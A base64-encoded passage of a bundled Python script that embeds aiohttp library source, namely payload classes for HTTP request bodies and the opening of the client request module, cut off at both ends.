gIHNlbGYsXHJcbiAgICAgICAgZGlzcHR5cGU6IHN0cixcclxuICAgICAgICBxdW90ZV9maWVsZHM6IGJvb2wgPSBUcnVlLFxyXG4gICAgICAgIF9jaGFyc2V0OiBzdHIgPSAidXRmLTgiLFxyXG4gICAgICAgICoqcGFyYW1zOiBBbnksXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiU2V0cyBgYENvbnRlbnQtRGlzcG9zaXRpb25gYCBoZWFkZXIuIiIiXHJcbiAgICAgICAgc2VsZi5faGVhZGVyc1toZHJzLkNPTlRFTlRfRElTUE9TSVRJT05dID0gY29udGVudF9kaXNwb3NpdGlvbl9oZWFkZXIoXHJcbiAgICAgICAgICAgIGRpc3B0eXBlLCBxdW90ZV9maWVsZHM9cXVvdGVfZmllbGRzLCBfY2hhcnNldD1fY2hhcnNldCwgKipwYXJhbXNcclxuICAgICAgICApXHJcblxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBhc3luYyBkZWYgd3JpdGUoc2VsZiwgd3JpdGVyOiBBYnN0cmFjdFN0cmVhbVdyaXRlcikgLT4gTm9uZTpcclxuICAgICAgICAiIiJXcml0ZSBwYXlsb2FkLlxyXG5cclxuICAgICAgICB3cml0ZXIgaXMgYW4gQWJzdHJhY3RTdHJlYW1Xcml0ZXIgaW5zdGFuY2U6XHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuY2xhc3MgQnl0ZXNQYXlsb2FkKFBheWxvYWQpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHZhbHVlOiBCeXRlU3RyaW5nLCAqYXJnczogQW55LCAqKmt3YXJnczogQW55KSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHZhbHVlLCAoYnl0ZXMsIGJ5dGVhcnJheSwgbWVtb3J5dmlldykpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoZiJ2YWx1ZSBhcmd1bWVudCBtdXN0IGJlIGJ5dGUtaXNoLCBub3Qge3R5cGUodmFsdWUpIXJ9IilcclxuXHJcbiAgICAgICAgaWYgImNvbnRlbnRfdHlwZSIgbm90IGluIGt3YXJnczpcclxuICAgICAgICAgICAga3dhcmdzWyJjb250ZW50X3R5cGUiXSA9ICJhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iXHJcblxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18odmFsdWUsICphcmdzLCAqKmt3YXJncylcclxuXHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZSh2YWx1ZSwgbWVtb3J5dmlldyk6XHJcbiAgICAgICAgICAgIHNlbGYuX3NpemUgPSB2YWx1ZS5uYnl0ZXNcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzZWxmLl9zaXplID0gbGVuKHZhbHVlKVxyXG5cclxuICAgICAgICBpZiBzZWxmLl9zaXplID4gVE9PX0xBUkdFX0JZVEVTX0JPRFk6XHJcbiAgICAgICAgICAgIGlmIFBZXzM2OlxyXG4gICAgICAgICAgICAgICAga3dhcmdzID0geyJzb3VyY2UiOiBzZWxmfVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAga3dhcmdzID0ge31cclxuICAgICAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgICAgICJTZW5kaW5nIGEgbGFyZ2UgYm9keSBkaXJlY3RseSB3aXRoIHJhdyBieXRlcyBtaWdodCJcclxuICAgICAgICAgICAgICAgICIgbG9jayB0aGUgZXZlbnQgbG9vcC4gWW91IHNob3VsZCBwcm9iYWJseSBwYXNzIGFuICJcclxuICAgICAgICAgICAgICAgICJpby5CeXRlc0lPIG9iamVjdCBpbnN0ZWFkIixcclxuICAgICAgICAgICAgICAgIFJlc291cmNlV2FybmluZyxcclxuICAgICAgICAgICAgICAgICoqa3dhcmdzLFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgYXN5bmMgZGVmIHdyaXRlKHNlbGYsIHdyaXRlcjogQWJzdHJhY3RTdHJlYW1Xcml0ZXIpIC0+IE5vbmU6XHJcbiAgICAgICAgYXdhaXQgd3JpdGVyLndyaXRlKHNlbGYuX3ZhbHVlKVxyXG5cclxuXHJcbmNsYXNzIFN0cmluZ1BheWxvYWQoQnl0ZXNQYXlsb2FkKTpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHZhbHVlOiBzdHIsXHJcbiAgICAgICAgKmFyZ3M6IEFueSxcclxuICAgICAgICBlbmNvZGluZzogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbiAgICAgICAgY29udGVudF90eXBlOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICAqKmt3YXJnczogQW55LFxyXG4gICAgKSAtPiBOb25lOlxyXG5cclxuICAgICAgICBpZiBlbmNvZGluZyBpcyBOb25lOlxyXG4gICAgICAgICAgICBpZiBjb250ZW50X3R5cGUgaXMgTm9uZTpcclxuICAgICAgICAgICAgICAgIHJlYWxfZW5jb2RpbmcgPSAidXRmLTgiXHJcbiAgICAgICAgICAgICAgICBjb250ZW50X3R5cGUgPSAidGV4dC9wbGFpbjsgY2hhcnNldD11dGYtOCJcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIG1pbWV0eXBlID0gcGFyc2VfbWltZXR5cGUoY29udGVudF90eXBlKVxyXG4gICAgICAgICAgICAgICAgcmVhbF9lbmNvZGluZyA9IG1pbWV0eXBlLnBhcmFtZXRlcnMuZ2V0KCJjaGFyc2V0IiwgInV0Zi04IilcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBpZiBjb250ZW50X3R5cGUgaXMgTm9uZTpcclxuICAgICAgICAgICAgICAgIGNvbnRlbnRfdHlwZSA9ICJ0ZXh0L3BsYWluOyBjaGFyc2V0PSVzIiAlIGVuY29kaW5nXHJcbiAgICAgICAgICAgIHJlYWxfZW5jb2RpbmcgPSBlbmNvZGluZ1xyXG5cclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKFxyXG4gICAgICAgICAgICB2YWx1ZS5lbmNvZGUocmVhbF9lbmNvZGluZyksXHJcbiAgICAgICAgICAgIGVuY29kaW5nPXJlYWxfZW5jb2RpbmcsXHJcbiAgICAgICAgICAgIGNvbnRlbnRfdHlwZT1jb250ZW50X3R5cGUsXHJcbiAgICAgICAgICAgICphcmdzLFxyXG4gICAgICAgICAgICAqKmt3YXJncyxcclxuICAgICAgICApXHJcblxyXG5cclxuY2xhc3MgU3RyaW5nSU9QYXlsb2FkKFN0cmluZ1BheWxvYWQpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHZhbHVlOiBJT1tzdHJdLCAqYXJnczogQW55LCAqKmt3YXJnczogQW55KSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18odmFsdWUucmVhZCgpLCAqYXJncywgKiprd2FyZ3MpXHJcblxyXG5cclxuY2xhc3MgSU9CYXNlUGF5bG9hZChQYXlsb2FkKTpcclxuICAgIF92YWx1ZTogSU9bQW55XVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLCB2YWx1ZTogSU9bQW55XSwgZGlzcG9zaXRpb246IHN0ciA9ICJhdHRhY2htZW50IiwgKmFyZ3M6IEFueSwgKiprd2FyZ3M6IEFueVxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGlmICJmaWxlbmFtZSIgbm90IGluIGt3YXJnczpcclxuICAgICAgICAgICAga3dhcmdzWyJmaWxlbmFtZSJdID0gZ3Vlc3NfZmlsZW5hbWUodmFsdWUpXHJcblxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18odmFsdWUsICphcmdzLCAqKmt3YXJncylcclxuXHJcbiAgICAgICAgaWYgc2VsZi5fZmlsZW5hbWUgaXMgbm90IE5vbmUgYW5kIGRpc3Bvc2l0aW9uIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBpZiBoZHJzLkNPTlRFTlRfRElTUE9TSVRJT04gbm90IGluIHNlbGYuaGVhZGVyczpcclxuICAgICAgICAgICAgICAgIHNlbGYuc2V0X2NvbnRlbnRfZGlzcG9zaXRpb24oZGlzcG9zaXRpb24sIGZpbGVuYW1lPXNlbGYuX2ZpbGVuYW1lKVxyXG5cclxuICAgIGFzeW5jIGRlZiB3cml0ZShzZWxmLCB3cml0ZXI6IEFic3RyYWN0U3RyZWFtV3JpdGVyKSAtPiBOb25lOlxyXG4gICAgICAgIGxvb3AgPSBhc3luY2lvLmdldF9ldmVudF9sb29wKClcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGNodW5rID0gYXdhaXQgbG9vcC5ydW5faW5fZXhlY3V0b3IoTm9uZSwgc2VsZi5fdmFsdWUucmVhZCwgMiAqKiAxNilcclxuICAgICAgICAgICAgd2hpbGUgY2h1bms6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCB3cml0ZXIud3JpdGUoY2h1bmspXHJcbiAgICAgICAgICAgICAgICBjaHVuayA9IGF3YWl0IGxvb3AucnVuX2luX2V4ZWN1dG9yKE5vbmUsIHNlbGYuX3ZhbHVlLnJlYWQsIDIgKiogMTYpXHJcbiAgICAgICAgZmluYWxseTpcclxuICAgICAgICAgICAgYXdhaXQgbG9vcC5ydW5faW5fZXhlY3V0b3IoTm9uZSwgc2VsZi5fdmFsdWUuY2xvc2UpXHJcblxyXG5cclxuY2xhc3MgVGV4dElPUGF5bG9hZChJT0Jhc2VQYXlsb2FkKTpcclxuICAgIF92YWx1ZTogVGV4dElPXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgdmFsdWU6IFRleHRJTyxcclxuICAgICAgICAqYXJnczogQW55LFxyXG4gICAgICAgIGVuY29kaW5nOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBjb250ZW50X3R5cGU6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgICAgICoqa3dhcmdzOiBBbnksXHJcbiAgICApIC0+IE5vbmU6XHJcblxyXG4gICAgICAgIGlmIGVuY29kaW5nIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGlmIGNvbnRlbnRfdHlwZSBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgZW5jb2RpbmcgPSAidXRmLTgiXHJcbiAgICAgICAgICAgICAgICBjb250ZW50X3R5cGUgPSAidGV4dC9wbGFpbjsgY2hhcnNldD11dGYtOCJcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIG1pbWV0eXBlID0gcGFyc2VfbWltZXR5cGUoY29udGVudF90eXBlKVxyXG4gICAgICAgICAgICAgICAgZW5jb2RpbmcgPSBtaW1ldHlwZS5wYXJhbWV0ZXJzLmdldCgiY2hhcnNldCIsICJ1dGYtOCIpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgaWYgY29udGVudF90eXBlIGlzIE5vbmU6XHJcbiAgICAgICAgICAgICAgICBjb250ZW50X3R5cGUgPSAidGV4dC9wbGFpbjsgY2hhcnNldD0lcyIgJSBlbmNvZGluZ1xyXG5cclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKFxyXG4gICAgICAgICAgICB2YWx1ZSxcclxuICAgICAgICAgICAgY29udGVudF90eXBlPWNvbnRlbnRfdHlwZSxcclxuICAgICAgICAgICAgZW5jb2Rpbmc9ZW5jb2RpbmcsXHJcbiAgICAgICAgICAgICphcmdzLFxyXG4gICAgICAgICAgICAqKmt3YXJncyxcclxuICAgICAgICApXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgc2l6ZShzZWxmKSAtPiBPcHRpb25hbFtpbnRdOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgcmV0dXJuIG9zLmZzdGF0KHNlbGYuX3ZhbHVlLmZpbGVubygpKS5zdF9zaXplIC0gc2VsZi5fdmFsdWUudGVsbCgpXHJcbiAgICAgICAgZXhjZXB0IE9TRXJyb3I6XHJcbiAgICAgICAgICAgIHJldHVybiBOb25lXHJcblxyXG4gICAgYXN5bmMgZGVmIHdyaXRlKHNlbGYsIHdyaXRlcjogQWJzdHJhY3RTdHJlYW1Xcml0ZXIpIC0+IE5vbmU6XHJcbiAgICAgICAgbG9vcCA9IGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKVxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgY2h1bmsgPSBhd2FpdCBsb29wLnJ1bl9pbl9leGVjdXRvcihOb25lLCBzZWxmLl92YWx1ZS5yZWFkLCAyICoqIDE2KVxyXG4gICAgICAgICAgICB3aGlsZSBjaHVuazpcclxuICAgICAgICAgICAgICAgIGRhdGEgPSAoXHJcbiAgICAgICAgICAgICAgICAgICAgY2h1bmsuZW5jb2RlKGVuY29kaW5nPXNlbGYuX2VuY29kaW5nKVxyXG4gICAgICAgICAgICAgICAgICAgIGlmIHNlbGYuX2VuY29kaW5nXHJcbiAgICAgICAgICAgICAgICAgICAgZWxzZSBjaHVuay5lbmNvZGUoKVxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgYXdhaXQgd3JpdGVyLndyaXRlKGRhdGEpXHJcbiAgICAgICAgICAgICAgICBjaHVuayA9IGF3YWl0IGxvb3AucnVuX2luX2V4ZWN1dG9yKE5vbmUsIHNlbGYuX3ZhbHVlLnJlYWQsIDIgKiogMTYpXHJcbiAgICAgICAgZmluYWxseTpcclxuICAgICAgICAgICAgYXdhaXQgbG9vcC5ydW5faW5fZXhlY3V0b3IoTm9uZSwgc2VsZi5fdmFsdWUuY2xvc2UpXHJcblxyXG5cclxuY2xhc3MgQnl0ZXNJT1BheWxvYWQoSU9CYXNlUGF5bG9hZCk6XHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBzaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICBwb3NpdGlvbiA9IHNlbGYuX3ZhbHVlLnRlbGwoKVxyXG4gICAgICAgIGVuZCA9IHNlbGYuX3ZhbHVlLnNlZWsoMCwgb3MuU0VFS19FTkQpXHJcbiAgICAgICAgc2VsZi5fdmFsdWUuc2Vlayhwb3NpdGlvbilcclxuICAgICAgICByZXR1cm4gZW5kIC0gcG9zaXRpb25cclxuXHJcblxyXG5jbGFzcyBCdWZmZXJlZFJlYWRlclBheWxvYWQoSU9CYXNlUGF5bG9hZCk6XHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBzaXplKHNlbGYpIC0+IE9wdGlvbmFsW2ludF06XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICByZXR1cm4gb3MuZnN0YXQoc2VsZi5fdmFsdWUuZmlsZW5vKCkpLnN0X3NpemUgLSBzZWxmLl92YWx1ZS50ZWxsKClcclxuICAgICAgICBleGNlcHQgT1NFcnJvcjpcclxuICAgICAgICAgICAgIyBkYXRhLmZpbGVubygpIGlzIG5vdCBzdXBwb3J0ZWQsIGUuZy5cclxuICAgICAgICAgICAgIyBpby5CdWZmZXJlZFJlYWRlcihpby5CeXRlc0lPKGJcJ2RhdGFcJykpXHJcbiAgICAgICAgICAgIHJldHVybiBOb25lXHJcblxyXG5cclxuY2xhc3MgSnNvblBheWxvYWQoQnl0ZXNQYXlsb2FkKTpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHZhbHVlOiBBbnksXHJcbiAgICAgICAgZW5jb2Rpbmc6IHN0ciA9ICJ1dGYtOCIsXHJcbiAgICAgICAgY29udGVudF90eXBlOiBzdHIgPSAiYXBwbGljYXRpb24vanNvbiIsXHJcbiAgICAgICAgZHVtcHM6IEpTT05FbmNvZGVyID0ganNvbi5kdW1wcyxcclxuICAgICAgICAqYXJnczogQW55LFxyXG4gICAgICAgICoqa3dhcmdzOiBBbnksXHJcbiAgICApIC0+IE5vbmU6XHJcblxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oXHJcbiAgICAgICAgICAgIGR1bXBzKHZhbHVlKS5lbmNvZGUoZW5jb2RpbmcpLFxyXG4gICAgICAgICAgICBjb250ZW50X3R5cGU9Y29udGVudF90eXBlLFxyXG4gICAgICAgICAgICBlbmNvZGluZz1lbmNvZGluZyxcclxuICAgICAgICAgICAgKmFyZ3MsXHJcbiAgICAgICAgICAgICoqa3dhcmdzLFxyXG4gICAgICAgIClcclxuXHJcblxyXG5pZiBUWVBFX0NIRUNLSU5HOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBmcm9tIHR5cGluZyBpbXBvcnQgQXN5bmNJdGVyYWJsZSwgQXN5bmNJdGVyYXRvclxyXG5cclxuICAgIF9Bc3luY0l0ZXJhdG9yID0gQXN5bmNJdGVyYXRvcltieXRlc11cclxuICAgIF9Bc3luY0l0ZXJhYmxlID0gQXN5bmNJdGVyYWJsZVtieXRlc11cclxuZWxzZTpcclxuICAgIGZyb20gY29sbGVjdGlvbnMuYWJjIGltcG9ydCBBc3luY0l0ZXJhYmxlLCBBc3luY0l0ZXJhdG9yXHJcblxyXG4gICAgX0FzeW5jSXRlcmF0b3IgPSBBc3luY0l0ZXJhdG9yXHJcbiAgICBfQXN5bmNJdGVyYWJsZSA9IEFzeW5jSXRlcmFibGVcclxuXHJcblxyXG5jbGFzcyBBc3luY0l0ZXJhYmxlUGF5bG9hZChQYXlsb2FkKTpcclxuXHJcbiAgICBfaXRlciA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbX0FzeW5jSXRlcmF0b3JdXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHZhbHVlOiBfQXN5bmNJdGVyYWJsZSwgKmFyZ3M6IEFueSwgKiprd2FyZ3M6IEFueSkgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZSh2YWx1ZSwgQXN5bmNJdGVyYWJsZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICJ2YWx1ZSBhcmd1bWVudCBtdXN0IHN1cHBvcnQgIlxyXG4gICAgICAgICAgICAgICAgImNvbGxlY3Rpb25zLmFiYy5Bc3luY0l0ZXJhYmxlYmUgaW50ZXJmYWNlLCAiXHJcbiAgICAgICAgICAgICAgICAiZ290IHshcn0iLmZvcm1hdCh0eXBlKHZhbHVlKSlcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiAiY29udGVudF90eXBlIiBub3QgaW4ga3dhcmdzOlxyXG4gICAgICAgICAgICBrd2FyZ3NbImNvbnRlbnRfdHlwZSJdID0gImFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSJcclxuXHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyh2YWx1ZSwgKmFyZ3MsICoqa3dhcmdzKVxyXG5cclxuICAgICAgICBzZWxmLl9pdGVyID0gdmFsdWUuX19haXRlcl9fKClcclxuXHJcbiAgICBhc3luYyBkZWYgd3JpdGUoc2VsZiwgd3JpdGVyOiBBYnN0cmFjdFN0cmVhbVdyaXRlcikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9pdGVyOlxyXG4gICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAjIGl0ZXIgaXMgbm90IE5vbmUgY2hlY2sgcHJldmVudHMgcmFyZSBjYXNlc1xyXG4gICAgICAgICAgICAgICAgIyB3aGVuIHRoZSBjYXNlIGl0ZXJhYmxlIGlzIHVzZWQgdHdpY2VcclxuICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6XHJcbiAgICAgICAgICAgICAgICAgICAgY2h1bmsgPSBhd2FpdCBzZWxmLl9pdGVyLl9fYW5leHRfXygpXHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgd3JpdGVyLndyaXRlKGNodW5rKVxyXG4gICAgICAgICAgICBleGNlcHQgU3RvcEFzeW5jSXRlcmF0aW9uOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5faXRlciA9IE5vbmVcclxuXHJcblxyXG5jbGFzcyBTdHJlYW1SZWFkZXJQYXlsb2FkKEFzeW5jSXRlcmFibGVQYXlsb2FkKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCB2YWx1ZTogU3RyZWFtUmVhZGVyLCAqYXJnczogQW55LCAqKmt3YXJnczogQW55KSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18odmFsdWUuaXRlcl9hbnkoKSwgKmFyZ3MsICoqa3dhcmdzKVxyXG5cclxuXHJcblBBWUxPQURfUkVHSVNUUlkgPSBQYXlsb2FkUmVnaXN0cnkoKVxyXG5QQVlMT0FEX1JFR0lTVFJZLnJlZ2lzdGVyKEJ5dGVzUGF5bG9hZCwgKGJ5dGVzLCBieXRlYXJyYXksIG1lbW9yeXZpZXcpKVxyXG5QQVlMT0FEX1JFR0lTVFJZLnJlZ2lzdGVyKFN0cmluZ1BheWxvYWQsIHN0cilcclxuUEFZTE9BRF9SRUdJU1RSWS5yZWdpc3RlcihTdHJpbmdJT1BheWxvYWQsIGlvLlN0cmluZ0lPKVxyXG5QQVlMT0FEX1JFR0lTVFJZLnJlZ2lzdGVyKFRleHRJT1BheWxvYWQsIGlvLlRleHRJT0Jhc2UpXHJcblBBWUxPQURfUkVHSVNUUlkucmVnaXN0ZXIoQnl0ZXNJT1BheWxvYWQsIGlvLkJ5dGVzSU8pXHJcblBBWUxPQURfUkVHSVNUUlkucmVnaXN0ZXIoQnVmZmVyZWRSZWFkZXJQYXlsb2FkLCAoaW8uQnVmZmVyZWRSZWFkZXIsIGlvLkJ1ZmZlcmVkUmFuZG9tKSlcclxuUEFZTE9BRF9SRUdJU1RSWS5yZWdpc3RlcihJT0Jhc2VQYXlsb2FkLCBpby5JT0Jhc2UpXHJcblBBWUxPQURfUkVHSVNUUlkucmVnaXN0ZXIoU3RyZWFtUmVhZGVyUGF5bG9hZCwgU3RyZWFtUmVhZGVyKVxyXG4jIHRyeV9sYXN0IGZvciBnaXZpbmcgYSBjaGFuY2UgdG8gbW9yZSBzcGVjaWFsaXplZCBhc3luYyBpbnRlcmFibGVzIGxpa2VcclxuIyBtdWx0aWRpY3QuQm9keVBhcnRSZWFkZXJQYXlsb2FkIG92ZXJyaWRlIHRoZSBkZWZhdWx0XHJcblBBWUxPQURfUkVHSVNUUlkucmVnaXN0ZXIoQXN5bmNJdGVyYWJsZVBheWxvYWQsIEFzeW5jSXRlcmFibGUsIG9yZGVyPU9yZGVyLnRyeV9sYXN0KVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC9jbGllbnRfcmVxcmVwLnB5JywgYidpbXBvcnQgYXN5bmNpb1xyXG5pbXBvcnQgY29kZWNzXHJcbmltcG9ydCBmdW5jdG9vbHNcclxuaW1wb3J0IGlvXHJcbmltcG9ydCByZVxyXG5pbXBvcnQgc3lzXHJcbmltcG9ydCB0cmFjZWJhY2tcclxuaW1wb3J0IHdhcm5pbmdzXHJcbmZyb20gaGFzaGxpYiBpbXBvcnQgbWQ1LCBzaGExLCBzaGEyNTZcclxuZnJvbSBodHRwLmNvb2tpZXMgaW1wb3J0IENvb2tpZUVycm9yLCBNb3JzZWwsIFNpbXBsZUNvb2tpZVxyXG5mcm9tIHR5cGVzIGltcG9ydCBNYXBwaW5nUHJveHlUeXBlLCBUcmFjZWJhY2tUeXBlXHJcbmZyb20gdHlwaW5nIGltcG9ydCAoXHJcbiAgICBUWVBFX0NIRUNLSU5HLFxyXG4gICAgQW55LFxyXG4gICAgRGljdCxcclxuICAgIEl0ZXJhYmxlLFxyXG4gICAgTGlzdCxcclxuICAgIE1hcHBpbmcsXHJcbiAgICBPcHRpb25hbCxcclxuICAgIFR1cGxlLFxyXG4gICAgVHlwZSxcclxuICAgIFVuaW9uLFxyXG4gICAgY2FzdCxcclxuKVxyXG5cclxuaW1wb3J0IGF0dHJcclxuZnJvbSBtdWx0aWRpY3QgaW1wb3J0IENJTXVsdGlEaWN0LCBDSU11bHRpRGljdFByb3h5LCBNdWx0aURpY3QsIE11bHRpRGljdFByb3h5XHJcbmZyb20geWFybCBpbXBvcnQgVVJMXHJcblxyXG5mcm9tIC4gaW1wb3J0IGhkcnMsIGhlbHBlcnMsIGh0dHAsIG11bHRpcGFydCwgcGF5bG9hZFxyXG5mcm9tIC5hYmMgaW1wb3J0IEFic3RyYWN0U3RyZWFtV3JpdGVyXHJcbmZyb20gLmNsaWVudF9leGNlcHRpb25zIGltcG9ydCAoXHJcbiAgICBDbGllbnRDb25uZWN0aW9uRXJyb3IsXHJcbiAgICBDbGllbnRPU0Vycm9yLFxyXG4gICAgQ2xpZW50UmVzcG9uc2VFcnJvcixcclxuICAgIENvbnRlbnRUeXBlRXJyb3IsXHJcbiAgICBJbnZhbGlkVVJMLFxyXG4gICAgU2VydmVyRmluZ2VycHJpbnRNaXNtYXRjaCxcclxuKVxyXG5mcm9tIC5mb3JtZGF0YSBpbXBvcnQgRm9ybURhdGFcclxuZnJvbSAuaGVscGVycyBpbXBvcnQgKFxyXG4gICAgUFlfMzYsXHJcbiAgICBCYXNlVGltZXJDb250ZXh0LFxyXG4gICAgQmFzaWNBdXRoLFxyXG4gICAgSGVhZGVyc01peGluLFxyXG4gICAgVGltZXJOb29wLFxyXG4gICAgbm9vcCxcclxuICAgIHJlaWZ5LFxyXG4gICAgc2V0X3Jlc3VsdCxcclxuKVxyXG5mcm9tIC5odHRwIGltcG9ydCBTRVJWRVJfU09GVFdBUkUsIEh0dHBWZXJzaW9uMTAsIEh0dHBWZXJzaW9uMTEsIFN0cmVhbVdyaXRlclxyXG5mcm9tIC5sb2cgaW1wb3J0IGNsaWVudF9sb2dnZXJcclxuZnJvbSAuc3RyZWFtcyBpbXBvcnQgU3RyZWFtUmVhZGVyXHJcbmZyb20gLnR5cGVkZWZzIGltcG9ydCAoXHJcbiAgICBERUZBVUxUX0pTT05fREVDT0RFUixcclxuICAgIEpTT05EZWNvZGVyLFxyXG4gICAgTG9vc2VDb29raWVzLFxyXG4gICAgTG9vc2VIZWFkZXJzLFxyXG4gICAgUmF3SGVhZGVycyxcclxuKVxyXG5cclxudHJ5OlxyXG4gICAgaW1wb3J0IHNzbFxyXG4gICAgZnJvbSBzc2wgaW1wb3J0IFNTTENvbnRleHRcclxuZXhjZXB0IEltcG9ydEVycm9yOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBzc2wgPSBOb25lICAjIHR5cGU6IGlnbm9yZVthc3NpZ25tZW50XVxyXG4gICAgU1NMQ29udGV4dCA9IG9iamVjdCAgIyB0eXBlOiBpZ25vcmVbbWlzYyxhc3NpZ25tZW50XVxyXG5cclxudHJ5OlxyXG4gICAgaW1wb3J0IGNjaGFyZGV0IGFzIGNoYXJkZXRcclxuZXhjZXB0IEltcG9ydEVycm9yOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBpbXBvcnQgY2hhcnNldF9ub3JtYWxpemVyIGFzIGNoYXJkZXQgICMgdHlwZTogaWdub3JlW25vLXJlZGVmXVxyXG5cclxuXHJcbl9fYWxsX18gPSAoIkNsaWVudFJlcXVlc3QiLCAiQ2xpZW50UmVzcG9uc2UiLCAiUmVxdWVzdEluZm8iLCAiRmluZ2VycHJpbnQiKVxyXG5cclxuXHJcbmlmIFRZUEVfQ0hFQ0tJTkc6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIGZyb20gLmNsaWVudCBpbXBvcnQgQ2xpZW50U2Vzc2lvblxyXG4gICAgZnJvbSAuY29ubmVjdG9yIGltcG9ydCBDb25uZWN0aW9uXHJcbiAgICBmcm9tIC50cmFjaW5nIGltcG9ydCBUcmFjZVxyXG5cclxuXHJcbmpzb25fcmUgPSByZS5jb21waWxlKHIiXmFwcGxpY2F0aW9uLyg/OltcXHcuKy1dKz9cXCspP2pzb24iKVxyXG5cclxuXHJcbkBhdHRyLnMoYXV0b19hdHRyaWJzPVRydWUsIGZyb3plbj1UcnVlLCBzbG90cz1UcnVlKVxyXG5jbGFzcyBDb250ZW50RGlzcG9zaXRpb246XHJcbiAgICB0eXBlOiBPcHRpb25hbFtzdHJdXHJcbiAgICBwYXJhbWV0ZXJzOiAiTWFwcGluZ1Byb3h5VHlwZVtzdHIsIHN0cl0iXHJcbiAgICBmaWxlbmFtZTogT3B0aW9uYWxbc3RyXVxyXG5cclxuXHJcbkBhdHRyLnMoYXV0b19hdHRyaWJzPVRydWUsIGZyb3plbj1UcnVlLCBzbG90cz1UcnVlKVxyXG5jbGFzcyBSZXF1ZXN0SW5mbzpcclxuICAgIHVybDogVVJMXHJcbiAgICBtZXRob2Q6IHN0clxyXG4gICAgaGVhZGVyczogIkNJTXVsdGlEaWN0UHJveHlbc3RyXSJcclxuICAgIHJlYWxfdXJsOiBVUkwgPSBhdHRyLmliKClcclxuXHJcbiAgICBAcmVhbF91cmwuZGVmYXVsdFxyXG4gICAgZGVmIHJlYWxfdXJsX2RlZmF1bHQoc2VsZikgLT4gVVJMOlxyXG4gICAgICAgIHJldHVybiBzZWxmLnVybFxyXG5cclxuXHJcbmNsYXNzIEZpbmdlcnByaW50OlxyXG4gICAgSEFTSEZVTkNfQllfRElHRVNUTEVOID0ge1xyXG4gICAgICAgIDE2OiBtZDUsXHJcbiAgICAgICAgMjA6IHNoYTEsXHJcbiAgICAgICAgMzI6IHNoYTI1NixcclxuICAgIH1cclxuXHJcbiAgICBkZWYgX19pbml0X18oc2